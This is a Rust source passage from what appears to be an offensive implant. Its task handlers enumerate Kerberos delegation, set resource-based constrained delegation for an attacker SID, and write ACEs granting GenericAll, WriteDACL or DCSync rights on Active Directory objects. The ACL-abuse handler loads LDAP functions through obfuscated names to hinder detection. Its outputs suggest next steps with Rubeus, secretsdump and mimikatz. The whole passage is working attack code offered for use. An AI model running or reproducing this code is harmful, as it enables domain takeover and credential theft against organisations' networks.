        &["sAMAccountName","distinguishedName","userAccountControl",
          "msDS-AllowedToDelegateTo","msDS-AllowedToActOnBehalfOfOtherIdentity",
          "servicePrincipalName"])
    {
        Ok(r) => r,
        Err(e) => return TaskOutput::failure(&format!("s4u: {e}")),
    };

    let delegations: Vec<serde_json::Value> = objects.iter().map(|(dn, attrs)| {
        let get = |n: &str| -> Vec<String> {
            attrs.iter().find(|(k, _)| k == n)
                .map(|(_, v)| v.clone())
                .unwrap_or_default()
        };
        let uac: u64 = get("userAccountControl").first()
            .and_then(|s| s.parse().ok()).unwrap_or(0);
        let trusted_to_auth = uac & 0x01000000 != 0; // TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION
        serde_json::json!({
            "dn":       dn,
            "name":     get("sAMAccountName").into_iter().next().unwrap_or_default(),
            "allowed_to_delegate_to":   get("msDS-AllowedToDelegateTo"),
            "rbcd_target_of":           get("msDS-AllowedToActOnBehalfOfOtherIdentity"),
            "spns":                     get("servicePrincipalName"),
            "protocol_transition":      trusted_to_auth,
            "attack": if trusted_to_auth {
                "S4U2Self: can impersonate any user for any listed service"
            } else {
                "S4U2Proxy only: need existing TGS from target user"
            }
        })
    }).collect();

    let result = serde_json::json!({
        "domain":      domain_fqdn,
        "dc":          dc,
        "total":       delegations.len(),
        "delegations": delegations,
        "attack_overview": {
            "s4u2self": "Request ST for arbitrary user without their credentials (if TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION)",
            "s4u2proxy": "Use S4U2Self ST + own TGT to get ST to delegated services",
            "next_step": "Use Rubeus: s4u /user:<name> /impersonateuser:administrator /msdsspn:<spn> /ticket:<tgt_b64>"
        }
    });
    TaskOutput::success(serde_json::to_vec(&result).unwrap_or_default())
}

// ── RBCD (Resource-Based Constrained Delegation) ──────────────────────────────
//
// Adds a computer/service account to msDS-AllowedToActOnBehalfOfOtherIdentity
// on the target, enabling S4U abuse from that attacker-controlled account.
// Requires: write access to target's msDS-AllowedToActOnBehalfOfOtherIdentity.
// Args: {"target":"<dn_or_sam>","attacker_sid":"<S-1-5-21-...>",
//        "domain":"<fqdn>","dc":"<hostname>","remove":true}

#[cfg(target_os = "windows")]
fn priv_rbcd(v: &serde_json::Value) -> TaskOutput {
    let domain_fqdn = match std::env::var("USERDNSDOMAIN").ok()
        .or_else(|| v.get("domain").and_then(|s| s.as_str()).map(|s| s.to_string()))
    {
        Some(d) => d.to_lowercase(),
        None => return TaskOutput::failure("rbcd: USERDNSDOMAIN not set"),
    };
    let dc = v.get("dc").and_then(|s| s.as_str())
        .map(|s| s.to_string())
        .unwrap_or_else(|| domain_fqdn.clone());
    let base_dn: String = domain_fqdn.split('.')
        .map(|p| format!("DC={p}")).collect::<Vec<_>>().join(",");

    let target = match v.get("target").and_then(|s| s.as_str()) {
        Some(t) => t,
        None => return TaskOutput::failure("rbcd: missing target"),
    };
    let attacker_sid_str = match v.get("attacker_sid").and_then(|s| s.as_str()) {
        Some(s) => s,
        None => return TaskOutput::failure("rbcd: missing attacker_sid"),
    };
    let remove = v.get("remove").and_then(|b| b.as_bool()).unwrap_or(false);

    let wldap = match wldap_base() {
        Ok(b) => b,
        Err(e) => return TaskOutput::failure(&format!("rbcd: {e}")),
    };

    // Resolve target DN if given as sAMAccountName
    let target_dn = if target.contains('=') {
        target.to_string()
    } else {
        let filter = format!("(sAMAccountName={target})");
        match ldap_query_list(wldap, &dc, &base_dn, &filter, &["distinguishedName"]) {
            Ok(r) if !r.is_empty() => r[0].0.clone(),
            Ok(_) => return TaskOutput::failure(&format!("rbcd: target '{target}' not found")),
            Err(e) => return TaskOutput::failure(&format!("rbcd: ldap lookup: {e}")),
        }
    };

    if remove {
        match ldap_modify_binary(wldap, &dc, &target_dn,
            "msDS-AllowedToActOnBehalfOfOtherIdentity", &[], 2)
        {
            Ok(()) => return TaskOutput::success(
                serde_json::to_vec(&serde_json::json!({"status":"rbcd cleared","target":target_dn}))
                .unwrap_or_default()),
            Err(e) => return TaskOutput::failure(&format!("rbcd: clear failed: {e}")),
        }
    }

    // Parse attacker SID string to bytes
    // msDS-AllowedToActOnBehalfOfOtherIdentity value = Security Descriptor (SD)
    // SD containing DACL with an ACE allowing the attacker SID to access via Kerberos
    // Structure: SecurityDescriptor with DACL: ACCESS_ALLOWED_ACE(attacker_sid)

    let sid_parts: Vec<u32> = {
        let parts: Vec<&str> = attacker_sid_str.trim().split('-').collect();
        if parts.len() < 4 { return TaskOutput::failure("rbcd: invalid attacker_sid format"); }
        let start = if parts[0] == "S" { 3 } else { return TaskOutput::failure("rbcd: SID must start with S-"); };
        parts[start..].iter()
            .filter_map(|p| p.parse::<u32>().ok())
            .collect()
    };
    let sub_auth_count = sid_parts.len() as u8;
    let mut sid_bytes = Vec::new();
    sid_bytes.push(1u8);                              // Revision
    sid_bytes.push(sub_auth_count);                   // SubAuthorityCount
    sid_bytes.extend_from_slice(&[0, 0, 0, 0, 0, 5]); // NT Authority
    for &sa in &sid_parts { sid_bytes.extend_from_slice(&sa.to_le_bytes()); }

    // Build Security Descriptor:
    // Revision(1) + Sbz1(1) + Control(2) + OffOwner(4) + OffGroup(4) + OffSacl(4) + OffDacl(4) = 20 bytes
    // Then DACL: AclRevision(1) + Sbz1(1) + AclSize(2) + AceCount(2) + Sbz2(2) = 8 bytes
    // Then ACE: AceType(1=ACCESS_ALLOWED) + AceFlags(1) + AceSize(2) + AccessMask(4) + SID
    let ace_size = (4 + 4 + sid_bytes.len()) as u16; // type+flags+size + mask + sid
    let acl_size = 8 + ace_size as usize;
    let dacl_off: u32 = 20;
    let total_sd = 20 + acl_size;

    let mut sd = Vec::with_capacity(total_sd);
    sd.push(1u8);                                           // Revision
    sd.push(0u8);                                           // Sbz1
    sd.extend_from_slice(&0x0004u16.to_le_bytes());         // Control: SE_DACL_PRESENT
    sd.extend_from_slice(&0u32.to_le_bytes());              // OffOwner (no owner)
    sd.extend_from_slice(&0u32.to_le_bytes());              // OffGroup
    sd.extend_from_slice(&0u32.to_le_bytes());              // OffSacl
    sd.extend_from_slice(&dacl_off.to_le_bytes());          // OffDacl
    // DACL ACL header
    sd.push(2u8);                                           // AclRevision
    sd.push(0u8);                                           // Sbz1
    sd.extend_from_slice(&(acl_size as u16).to_le_bytes()); // AclSize
    sd.extend_from_slice(&1u16.to_le_bytes());              // AceCount
    sd.extend_from_slice(&0u16.to_le_bytes());              // Sbz2
    // ACE: ACCESS_ALLOWED_ACE
    sd.push(0u8);                                           // AceType = ACCESS_ALLOWED
    sd.push(0u8);                                           // AceFlags
    sd.extend_from_slice(&ace_size.to_le_bytes());          // AceSize
    sd.extend_from_slice(&0x001f01ffu32.to_le_bytes());     // AccessMask (GENERIC_ALL)
    sd.extend_from_slice(&sid_bytes);                       // SID

    match ldap_modify_binary(wldap, &dc, &target_dn,
        "msDS-AllowedToActOnBehalfOfOtherIdentity", &sd, 0)
    {
        Ok(()) => {},
        Err(e) => return TaskOutput::failure(&format!("rbcd: ldap modify: {e}")),
    }

    let result = serde_json::json!({
        "status":       "RBCD configured",
        "target":       target_dn,
        "attacker_sid": attacker_sid_str,
        "next_step": format!(
            "Use Rubeus: s4u /user:<attacker_computer$> /rc4:<ntlm> /impersonateuser:administrator /msdsspn:cifs/{target} /ptt"
        ),
        "cleanup":  format!("priv/rbcd target={target} remove=true"),
    });
    TaskOutput::success(serde_json::to_vec(&result).unwrap_or_default())
}

// ── ACL Abuse (Phase 4I) ──────────────────────────────────────────────────────
//
// Writes a targeted ACE to an AD object's DACL.
// Grants trustee new permissions (write-dacl/write-owner/generic-all/
// full-control/dcsync) without removing existing ACEs.
//
// Args: {"action":"add|list","target":"<cn or sAMAccountName>",
//        "trustee_sid":"S-1-5-21-...","right":"write-dacl|write-owner|
//        generic-all|full-control|dcsync","domain":"corp.local",
//        "dc":"dc01.corp.local"}

#[cfg(target_os = "windows")]
fn priv_acl_abuse(v: &serde_json::Value) -> TaskOutput {
    let domain = match v.get("domain").and_then(|s| s.as_str())
        .map(|s| s.to_lowercase())
        .or_else(|| std::env::var("USERDNSDOMAIN").ok().map(|s| s.to_lowercase()))
    {
        Some(d) if !d.is_empty() => d,
        _ => return TaskOutput::failure("acl-abuse: missing domain"),
    };
    let dc = v.get("dc").and_then(|s| s.as_str())
        .map(|s| s.to_string())
        .unwrap_or_else(|| domain.clone());
    let target = match v.get("target").and_then(|s| s.as_str()) {
        Some(t) => t.to_string(),
        None => return TaskOutput::failure("acl-abuse: missing target"),
    };
    let trustee_sid_str = v.get("trustee_sid").and_then(|s| s.as_str())
        .unwrap_or("").to_string();
    let right  = v.get("right").and_then(|s| s.as_str()).unwrap_or("write-dacl").to_string();
    let action = v.get("action").and_then(|s| s.as_str()).unwrap_or("add").to_string();

    let base_dn: String = domain.split('.')
        .map(|p| format!("DC={p}")).collect::<Vec<_>>().join(",");

    let wldap = match wldap_base() {
        Ok(w) => w,
        Err(e) => return TaskOutput::failure(&format!("acl-abuse: {e}")),
    };

    type LdapInitFn       = unsafe extern "system" fn(*const u8, u32) -> *mut u8;
    type LdapSetOptFn     = unsafe extern "system" fn(*mut u8, i32, *const u8) -> u32;
    type LdapBindFn       = unsafe extern "system" fn(*mut u8, *const u8, *const u8, u32) -> u32;
    type LdapSearchFn     = unsafe extern "system" fn(*mut u8,*const u8,i32,*const u8,*const *const u8,i32,*mut *mut u8) -> u32;
    type LdapFirstFn      = unsafe extern "system" fn(*mut u8, *mut u8) -> *mut u8;
    type LdapGetDnFn      = unsafe extern "system" fn(*mut u8, *mut u8) -> *mut u8;
    type LdapMemFreeFn    = unsafe extern "system" fn(*mut u8);
    type LdapGetLenValsFn = unsafe extern "system" fn(*mut u8, *mut u8, *const u8) -> *mut *mut u8;
    type LdapLenFreeFn    = unsafe extern "system" fn(*mut *mut u8) -> u32;
    type LdapMsgFreeFn    = unsafe extern "system" fn(*mut u8) -> u32;
    type LdapModFn        = unsafe extern "system" fn(*mut u8, *const u8, *const *const u8) -> u32;
    type LdapUnbindFn     = unsafe extern "system" fn(*mut u8) -> u32;

    macro_rules! wl { ($enc:expr, $ty:ty) => {{
        match unsafe { crate::loader::get_export_by_name(wldap, crate::obfs::dec($enc).as_ptr()) } {
            Some(p) => unsafe { core::mem::transmute::<_, $ty>(p) },
            None    => return TaskOutput::failure("acl-abuse: wldap fn not found"),
        }
    }}}

    let fn_init       = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x33,0x34,0x33,0x2E,0x5A], LdapInitFn);
    let fn_setopt     = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x29,0x3F,0x2E,0x05,0x35,0x2A,0x2E,0x33,0x35,0x34,0x5A], LdapSetOptFn);
    let fn_bind       = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x18,0x33,0x34,0x3E,0x05,0x29,0x5A], LdapBindFn);
    let fn_search     = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x29,0x3F,0x3B,0x28,0x39,0x32,0x05,0x29,0x5A], LdapSearchFn);
    let fn_first      = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3C,0x33,0x28,0x29,0x2E,0x05,0x3F,0x34,0x2E,0x28,0x23,0x5A], LdapFirstFn);
    let fn_getdn      = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3D,0x3F,0x2E,0x05,0x3E,0x34,0x5A], LdapGetDnFn);
    let fn_memfree    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x37,0x3F,0x37,0x3C,0x28,0x3F,0x3F,0x5A], LdapMemFreeFn);
    let fn_getlenvals = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3D,0x3F,0x2E,0x05,0x2C,0x3B,0x36,0x2F,0x3F,0x29,0x05,0x36,0x3F,0x34,0x5A], LdapGetLenValsFn);
    let fn_lenfree    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2C,0x3B,0x36,0x2F,0x3F,0x05,0x3C,0x28,0x3F,0x3F,0x05,0x36,0x3F,0x34,0x5A], LdapLenFreeFn);
    let fn_msgfree    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x37,0x29,0x3D,0x3C,0x28,0x3F,0x3F,0x5A], LdapMsgFreeFn);
    let fn_modify     = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x37,0x35,0x3E,0x33,0x3C,0x23,0x05,0x29,0x5A], LdapModFn);
    let fn_unbind     = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2F,0x34,0x18,0x33,0x34,0x3E,0x5A], LdapUnbindFn);

    let dc_b: Vec<u8> = dc.bytes().chain(core::iter::once(0u8)).collect();
    let ld = unsafe { fn_init(dc_b.as_ptr(), 389) };
    if ld.is_null() { return TaskOutput::failure("acl-abuse: ldap_init failed"); }
    let ver: u32 = 3;
    unsafe { fn_setopt(ld, 0x11, &ver as *const u32 as *const u8) };
    let br = unsafe { fn_bind(ld, core::ptr::null(), core::ptr::null(), 0x0486) };
    if br != 0 {
        unsafe { fn_unbind(ld) };
        return TaskOutput::failure(&format!("acl-abuse: ldap_bind: {br:#x}"));
    }

    let filter   = format!("(|(cn={target})(sAMAccountName={target})(distinguishedName={target}))");
    let filter_b: Vec<u8> = filter.bytes().chain(core::iter::once(0u8)).collect();
    let base_b:   Vec<u8> = base_dn.bytes().chain(core::iter::once(0u8)).collect();
    let attr_sd:  Vec<u8> = b"nTSecurityDescriptor\0".to_vec();
    let attr_ptrs: [*const u8; 2] = [attr_sd.as_ptr(), core::ptr::null()];

    let mut res_msg: *mut u8 = core::ptr::null_mut();
    let sr = unsafe {
        fn_search(ld, base_b.as_ptr(), 2, filter_b.as_ptr(),
                  attr_ptrs.as_ptr(), 0, &mut res_msg)
    };
    if sr != 0 {
        unsafe { fn_unbind(ld) };
        return TaskOutput::failure(&format!("acl-abuse: ldap_search: {sr:#x}"));
    }

    let entry = unsafe { fn_first(ld, res_msg) };
    if entry.is_null() {
        unsafe { fn_msgfree(res_msg); fn_unbind(ld) };
        return TaskOutput::failure(&format!("acl-abuse: target '{target}' not found"));
    }

    let dn_ptr = unsafe { fn_getdn(ld, entry) };
    let target_dn = if dn_ptr.is_null() { target.clone() } else {
        let s = unsafe { std::ffi::CStr::from_ptr(dn_ptr as *const i8) }
            .to_string_lossy().to_string();
        unsafe { fn_memfree(dn_ptr) };
        s
    };

    // Read nTSecurityDescriptor via BERVAL (preserves binary data past null bytes)
    let bvs = unsafe { fn_getlenvals(ld, entry, attr_sd.as_ptr()) };
    let sd_bytes: Vec<u8> = if bvs.is_null() {
        vec![]
    } else {
        let bv0 = unsafe { *bvs };
        let data = if bv0.is_null() { vec![] } else {
            let bv_len = unsafe { *(bv0 as *const u32) } as usize;
            let bv_val = unsafe { *((bv0 as *const u8).add(8) as *const *const u8) };
            if bv_val.is_null() || bv_len == 0 { vec![] }
            else { unsafe { core::slice::from_raw_parts(bv_val, bv_len) }.to_vec() }
        };
        unsafe { fn_lenfree(bvs) };
        data
    };
    unsafe { fn_msgfree(res_msg) };

    if action == "list" {
        let aces = acl_parse_aces(&sd_bytes);
        unsafe { fn_unbind(ld) };
        let result = serde_json::json!({
            "status":    "listed",
            "target_dn": target_dn,
            "sd_size":   sd_bytes.len(),
            "aces":      aces,
        });
        return TaskOutput::success(serde_json::to_vec(&result).unwrap_or_default());
    }

    if trustee_sid_str.is_empty() {
        unsafe { fn_unbind(ld) };
        return TaskOutput::failure("acl-abuse: missing trustee_sid");
    }
    let trustee_sid = match acl_sid_from_str(&trustee_sid_str) {
        Some(s) => s,
        None => {
            unsafe { fn_unbind(ld) };
            return TaskOutput::failure("acl-abuse: invalid trustee_sid");
        }
    };
    if sd_bytes.len() < 20 {
        unsafe { fn_unbind(ld) };
        return TaskOutput::failure("acl-abuse: nTSecurityDescriptor not readable");
    }

    let aces_to_add = acl_build_aces(&right, &trustee_sid);
    if aces_to_add.is_empty() {
        unsafe { fn_unbind(ld) };
        return TaskOutput::failure(&format!("acl-abuse: unknown right '{right}'"));
    }

    let mut sd = sd_bytes;
    for ace in &aces_to_add {
        sd = match acl_append_ace(&sd, ace) {
            Ok(new_sd) => new_sd,
            Err(e) => {
                unsafe { fn_unbind(ld) };
                return TaskOutput::failure(&format!("acl-abuse: SD: {e}"));
            }
        };
    }

    // Write back modified SD: LDAP_MOD_REPLACE | LDAP_MOD_BVALUES
    let dn_b: Vec<u8> = target_dn.bytes().chain(core::iter::once(0u8)).collect();
    let mut berval = vec![0u8; 16];
    unsafe {
        *(berval.as_mut_ptr() as *mut u32)                         = sd.len() as u32;
        *((berval.as_mut_ptr().add(8)) as *mut *const u8)          = sd.as_ptr();
    }
    let bvals_arr: [*const u8; 2] = [berval.as_ptr(), core::ptr::null()];
    let mut ldap_mod = [0u8; 24];
    unsafe {
        *(ldap_mod.as_mut_ptr() as *mut u32)                              = 2u32 | 0x8000u32;
        *((ldap_mod.as_mut_ptr().add(8))  as *mut *const u8)              = attr_sd.as_ptr();
        *((ldap_mod.as_mut_ptr().add(16)) as *mut *const *const u8)       = bvals_arr.as_ptr();
    }
    let mods_arr: [*const u8; 2] = [ldap_mod.as_ptr(), core::ptr::null()];
    let mr = unsafe { fn_modify(ld, dn_b.as_ptr(), mods_arr.as_ptr()) };
    unsafe { fn_unbind(ld) };
    if mr != 0 {
        return TaskOutput::failure(&format!("acl-abuse: ldap_modify_s: {mr:#x}"));
    }

    let next_step = match right.as_str() {
        "dcsync"      => format!("secretsdump.py or mimikatz lsadump::dcsync against {target_dn}"),
        "write-dacl"  => format!("Now grant GenericAll for {trustee_sid_str} on {target_dn}"),
        "generic-all" => format!("Force-reset password or add to privileged group for {target_dn}"),
        "write-owner" => format!("Take ownership then grant GenericAll on {target_dn}"),
        _             => format!("ACE written on {target_dn}"),
    };
    let result = serde_json::json!({
        "status":      "ACE added",
        "target_dn":   target_dn,
        "trustee_sid": trustee_sid_str,
        "right":       right,
        "aces_added":  aces_to_add.len(),
        "next_step":   next_step,
    });
    TaskOutput::success(serde_json::to_vec(&result).unwrap_or_default())
}

#[cfg(not(target_os = "windows"))]
fn priv_acl_abuse(_: &serde_json::Value) -> TaskOutput {
    TaskOutput::failure("acl-abuse: not supported on non-Windows")
}

#[cfg(target_os = "windows")]
fn acl_sid_from_str(s: &str) -> Option<Vec<u8>> {
    let parts: Vec<&str> = s.split('-').collect();
    if parts.len() < 3 || parts[0] != "S" { return None; }
    let rev: u8 = parts[1].parse().ok()?;
    let auth: u64 = parts[2].parse().ok()?;
    let subs: Vec<u32> = parts[3..].iter()
        .map(|p| p.parse::<u32>()).collect::<Result<Vec<_>, _>>().ok()?;
    let mut sid = vec![rev, subs.len() as u8];
    sid.extend_from_slice(&auth.to_be_bytes()[2..]);
    for sa in &subs { sid.extend_from_slice(&sa.to_le_bytes()); }
    Some(sid)
}

#[cfg(target_os = "windows")]
fn acl_append_ace(sd: &[u8], ace: &[u8]) -> Result<Vec<u8>, String> {
    if sd.len() < 20 { return Err("SD too small".into()); }
    let dacl_off  = u32::from_le_bytes([sd[16],sd[17],sd[18],sd[19]]) as usize;
    if dacl_off == 0 { return Err("SD has no DACL".into()); }
    if dacl_off + 8 > sd.len() { return Err("DACL offset OOB".into()); }
    let acl_size  = u16::from_le_bytes([sd[dacl_off+2],sd[dacl_off+3]]) as usize;
    let ace_count = u16::from_le_bytes([sd[dacl_off+4],sd[dacl_off+5]]);
    let dacl_end  = dacl_off + acl_size;

    let mut new_sd = Vec::with_capacity(sd.len() + ace.len());
    new_sd.extend_from_slice(&sd[..dacl_end.min(sd.len())]);
    new_sd.extend_from_slice(ace);
    if dacl_end < sd.len() { new_sd.extend_from_slice(&sd[dacl_end..]); }

    let new_acl_size = (acl_size + ace.len()) as u16;
    new_sd[dacl_off+2..dacl_off+4].copy_from_slice(&new_acl_size.to_le_bytes());
    new_sd[dacl_off+4..dacl_off+6].copy_from_slice(&(ace_count + 1).to_le_bytes());

    // Adjust SD component offsets pointing past the old dacl_end
    let adj = ace.len() as u32;
    for &off_start in &[4usize, 8, 12, 16] {
        let o: u32 = u32::from_le_bytes(new_sd[off_start..off_start+4].try_into().unwrap());
        if o != 0 && o as usize > dacl_end {
            new_sd[off_start..off_start+4].copy_from_slice(&(o + adj).to_le_bytes());
        }
    }
    Ok(new_sd)
}

#[cfg(target_os = "windows")]
fn acl_build_aces(right: &str, sid: &[u8]) -> Vec<Vec<u8>> {
    match right {
        "write-dacl"   => vec![acl_make_ace(0x00040000, sid)],
        "write-owner"  => vec![acl_make_ace(0x00080000, sid)],
        "generic-all"  => vec![acl_make_ace(0x10000000, sid)],
        "full-control" => vec![acl_make_ace(0x001F01FF, sid)],
        "dcsync" => {
            // DS-Replication-Get-Changes       {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}
            // DS-Replication-Get-Changes-All   {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}
            let g1: [u8; 16] = [0xaa,0xf6,0x31,0x11,0x07,0x9c,0xd1,0x11,0xf7,0x9f,0x00,0xc0,0x4f,0xc2,0xdc,0xd2];
            let g2: [u8; 16] = [0xad,0xf6,0x31,0x11,0x07,0x9c,0xd1,0x11,0xf7,0x9f,0x00,0xc0,0x4f,0xc2,0xdc,0xd2];
            vec![acl_make_obj_ace(0x00000100, &g1, sid),
                 acl_make_obj_ace(0x00000100, &g2, sid)]
        }
        _ => vec![],
    }
}

#[cfg(target_os = "windows")]
fn acl_make_ace(mask: u32, sid: &[u8]) -> Vec<u8> {
    let size = (8 + sid.len()) as u16;
    let mut a = vec![0x00u8, 0x00]; // ACCESS_ALLOWED_ACE_TYPE, Flags=0
    a.extend_from_slice(&size.to_le_bytes());
    a.extend_from_slice(&mask.to_le_bytes());
    a.extend_from_slice(sid);
    a
}

#[cfg(target_os = "windows")]
fn acl_make_obj_ace(mask: u32, guid: &[u8; 16], sid: &[u8]) -> Vec<u8> {
    // ACCESS_ALLOWED_OBJECT_ACE_TYPE: header(4)+mask(4)+obj_flags(4)+guid(16)+sid
    let size = (4 + 4 + 4 + 16 + sid.len()) as u16;
    let mut a = vec![0x05u8, 0x00]; // type=ALLOW_OBJECT, flags=0
    a.extend_from_slice(&size.to_le_bytes());
    a.extend_from_slice(&mask.to_le_bytes());
    a.extend_from_slice(&1u32.to_le_bytes()); // ACE_OBJECT_TYPE_PRESENT
    a.extend_from_slice(guid);
    a.extend_from_slice(sid);
    a
}

#[cfg(target_os = "windows")]
fn acl_parse_aces(sd: &[u8]) -> Vec<serde_json::Value> {
    if sd.len() < 20 { return vec![]; }
    let dacl_off = u32::from_le_bytes([sd[16],sd[17],sd[18],sd[19]]) as usize;
    if dacl_off == 0 || dacl_off + 8 > sd.len() { return vec![]; }
    let count = u16::from_le_bytes([sd[dacl_off+4],sd[dacl_off+5]]) as usize;
    let mut pos = dacl_off + 8;
    let mut out = Vec::new();
    for _ in 0..count {
        if pos + 4 > sd.len() { break; }
        let atype = sd[pos];
        let asize = u16::from_le_bytes([sd[pos+2],sd[pos+3]]) as usize;
        if asize < 4 || pos + asize > sd.len() { break; }
        let mask = if asize >= 8 {
            u32::from_le_bytes([sd[pos+4],sd[pos+5],sd[pos+6],sd[pos+7]])
        } else { 0 };
        let tname = match atype { 0 => "ALLOW", 1 => "DENY", 5 => "ALLOW_OBJECT", _ => "OTHER" };
        out.push(serde_json::json!({"type": tname, "mask": format!("{mask:#010x}")}));
        pos += asize;
    }
    out
}
